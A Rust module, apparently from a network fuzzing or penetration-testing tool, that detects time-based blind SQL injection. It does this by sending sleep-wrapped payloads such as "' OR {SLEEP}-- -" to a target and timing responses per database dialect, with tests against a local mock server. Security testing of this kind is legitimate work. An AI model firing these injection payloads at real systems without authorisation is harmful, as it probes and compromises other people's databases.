//! Time-based (blind) channel. FALLBACK ONLY — only run after error/boolean/
//! union have all been silent.
//!
//! Render `{SLEEP}` per dialect (`Dialect::render_sleep`), fire SERIALISED
//! (concurrency 1), confirm with `baseline.time_hit_threshold(n, k)`. Guard
//! the socket read-timeout so a sleeping payload that out-delays the budget
//! is handled, not left hanging — pass `max(sleep_secs*2 + margin, timeout)`
//! into `net::attempt`.
//!
//! OWNER (Phase 1): time+fingerprint agent.

use std::time::{Duration, Instant};

use anyhow::Result;

use crate::common::Framing;
use crate::net::{attempt, connect_and_sync};

use super::types::{Baseline, Channel, Dialect, SqliConfig, Verdict};

const TOKEN: &str = "{SLEEP}";
const BUILTIN_WRAPPERS: &[&str] = &["' OR {SLEEP}-- -", ") OR {SLEEP}-- -"];

/// Run time-channel probes against each candidate dialect. Opens / tears down
/// its own connections (no shared state with earlier channels). Returns one
/// verdict per confirmed dialect-channel pair.
pub async fn run(
    host: &str,
    port: u16,
    framing: &Framing,
    timeout_secs: u64,
    cfg: &SqliConfig,
    baseline: &Baseline,
    dialects: &[Dialect],
) -> Result<Vec<Verdict>> {
    let mut out = Vec::new();
    for &dialect in dialects {
        let Some(expr) = dialect.render_sleep(cfg.sleep_secs) else {
            continue;
        };
        if let Some(v) = try_wrappers(
            host,
            port,
            framing,
            timeout_secs,
            cfg,
            baseline,
            dialect,
            &expr,
            BUILTIN_WRAPPERS,
        )
        .await?
        {
            out.push(v);
        }
    }
    Ok(out)
}

/// Fire a single wordlist line containing `{SLEEP}` against each dialect;
/// return any confirmed verdict (one per matching dialect).
#[allow(clippy::too_many_arguments)]
pub async fn fire_wordlist_sleep(
    host: &str,
    port: u16,
    framing: &Framing,
    timeout_secs: u64,
    cfg: &SqliConfig,
    baseline: &Baseline,
    dialects: &[Dialect],
    payload_with_sleep_token: &str,
) -> Result<Vec<Verdict>> {
    let mut out = Vec::new();
    for &dialect in dialects {
        let Some(expr) = dialect.render_sleep(cfg.sleep_secs) else {
            continue;
        };
        if let Some(v) = try_wrappers(
            host,
            port,
            framing,
            timeout_secs,
            cfg,
            baseline,
            dialect,
            &expr,
            std::slice::from_ref(&payload_with_sleep_token),
        )
        .await?
        {
            out.push(v);
        }
    }
    Ok(out)
}

/// Try each wrapper in order against one dialect; return the first that confirms.
#[allow(clippy::too_many_arguments)]
async fn try_wrappers(
    host: &str,
    port: u16,
    framing: &Framing,
    timeout_secs: u64,
    cfg: &SqliConfig,
    baseline: &Baseline,
    dialect: Dialect,
    expr: &str,
    wrappers: &[&str],
) -> Result<Option<Verdict>> {
    for wrapper in wrappers {
        if let Some(v) = confirm_sleep(
            host,
            port,
            framing,
            timeout_secs,
            cfg,
            baseline,
            dialect,
            expr,
            wrapper,
        )
        .await?
        {
            return Ok(Some(v));
        }
    }
    Ok(None)
}

/// Fire `cfg.confirm` serialised observations of one rendered wrapper against
/// one dialect. Returns `Some(verdict)` only when every observation beats the
/// time threshold; `None` on first miss or socket error.
#[allow(clippy::too_many_arguments)]
async fn confirm_sleep(
    host: &str,
    port: u16,
    framing: &Framing,
    timeout_secs: u64,
    cfg: &SqliConfig,
    baseline: &Baseline,
    dialect: Dialect,
    sleep_expr: &str,
    wrapper_with_token: &str,
) -> Result<Option<Verdict>> {
    let rendered = wrapper_with_token.replace(TOKEN, sleep_expr);
    let threshold = baseline.time_hit_threshold(cfg.sleep_secs, 3.0);
    // Extended per-attempt read-timeout: a sleeping payload must not out-delay
    // the socket budget. `max` guards cfg.timeout_secs as the floor.
    let read_timeout = (cfg.sleep_secs as u64)
        .saturating_mul(2)
        .saturating_add(2)
        .max(timeout_secs);
    let n = cfg.confirm.max(1);

    let mut last_elapsed = Duration::ZERO;
    let mut last_payload = String::new();

    for _ in 0..n {
        let Ok(mut conn) = connect_and_sync(host, port, timeout_secs, framing).await else {
            return Ok(None);
        };
        let templated = framing.send_template.replace("FUZZ", &rendered);
        let t0 = Instant::now();
        let r = attempt(&mut conn, framing, &templated, read_timeout).await;
        let elapsed = t0.elapsed();
        if r.is_err() || elapsed < threshold {
            return Ok(None);
        }
        last_elapsed = elapsed;
        last_payload = templated;
    }

    let proof = format!(
        "\"{rendered}\" ({:.1}s vs {:.1}s baseline, {n}/{n})",
        last_elapsed.as_secs_f64(),
        baseline.rtt_mean.as_secs_f64(),
    );
    Ok(Some(Verdict {
        channel: Channel::Time,
        wrapper: Some(wrapper_with_token.to_string()),
        payload: last_payload,
        proof,
        engine: Some(dialect),
        allows: Vec::new(),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::{BannerSync, Framing};
    use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
    use tokio::net::TcpListener;

    /// Mock oracle: sleeps 2s when the request line contains `SLEEP(` (that is
    /// comfortably over the k=3 baseline threshold the test uses), otherwise
    /// replies instantly. Spec says "sleep for cfg.sleep_secs seconds" but with
    /// the fixed 100ms-mean / 50ms-σ baseline the k=3 threshold is 1.25s, so a
    /// 1s mock sleep never confirms. 2s keeps the test robust and still fast.
    async fn spawn_sleep_oracle() -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (sock, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => return,
                };
                tokio::spawn(async move {
                    let (r, mut w) = sock.into_split();
                    let mut r = BufReader::new(r);
                    loop {
                        let mut line = String::new();
                        let n = match r.read_line(&mut line).await {
                            Ok(n) => n,
                            Err(_) => return,
                        };
                        if n == 0 {
                            return;
                        }
                        if line.contains("SLEEP(") {
                            tokio::time::sleep(Duration::from_secs(2)).await;
                            if w.write_all(b"delayed\n").await.is_err() {
                                return;
                            }
                        } else if w.write_all(b"ok\n").await.is_err() {
                            return;
                        }
                    }
                });
            }
        });
        addr
    }

    fn framing_bare() -> Framing {
        Framing {
            send_template: "FUZZ".into(),
            eol: "\n".into(),
            prompt: None,
            banner: BannerSync::SkipLines(0),
        }
    }

    fn baseline_fixed() -> Baseline {
        Baseline {
            reply_shape: "ok".into(),
            rtt_mean: Duration::from_millis(100),
            rtt_stddev: Duration::from_millis(50),
            samples: 3,
        }
    }

    #[tokio::test]
    async fn run_confirms_mysql_against_sleep_oracle() {
        let addr = spawn_sleep_oracle().await;
        let framing = framing_bare();
        let cfg = SqliConfig {
            sleep_secs: 1,
            confirm: 1,
        };
        let baseline = baseline_fixed();

        let v = run(
            &addr.ip().to_string(),
            addr.port(),
            &framing,
            10,
            &cfg,
            &baseline,
            &[Dialect::MySql],
        )
        .await
        .unwrap();

        assert!(!v.is_empty(), "expected at least one time verdict");
        assert_eq!(v[0].channel, Channel::Time);
        assert_eq!(v[0].engine, Some(Dialect::MySql));
        assert_eq!(v[0].wrapper.as_deref(), Some("' OR {SLEEP}-- -"));
    }

    #[tokio::test]
    async fn fire_wordlist_sleep_confirms_user_token_line() {
        let addr = spawn_sleep_oracle().await;
        let framing = framing_bare();
        let cfg = SqliConfig {
            sleep_secs: 1,
            confirm: 1,
        };
        let baseline = baseline_fixed();
        let line = "' OR {SLEEP}-- -";

        let v = fire_wordlist_sleep(
            &addr.ip().to_string(),
            addr.port(),
            &framing,
            10,
            &cfg,
            &baseline,
            &[Dialect::MySql],
            line,
        )
        .await
        .unwrap();

        assert!(!v.is_empty(), "expected at least one time verdict");
        assert_eq!(v[0].channel, Channel::Time);
        assert_eq!(v[0].engine, Some(Dialect::MySql));
        assert_eq!(v[0].wrapper.as_deref(), Some(line));
    }
}
